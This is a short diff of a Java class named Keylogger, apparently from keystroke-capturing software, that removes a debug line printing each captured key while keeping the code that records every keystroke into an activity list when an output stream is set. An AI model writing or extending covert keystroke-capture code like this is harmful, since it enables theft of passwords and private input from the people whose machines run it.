@@ -20,7 +20,6 @@ public class Keylogger implements NativeKeyListener {
 		try {
 			if (Plugin.dos != null) {
 				Activities.add(new Key(arg0.getKeyChar()));
-				System.out.println("Added: " + arg0.getKeyChar());
 			}
 		} catch (Exception e) {
 			System.err.println("Error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
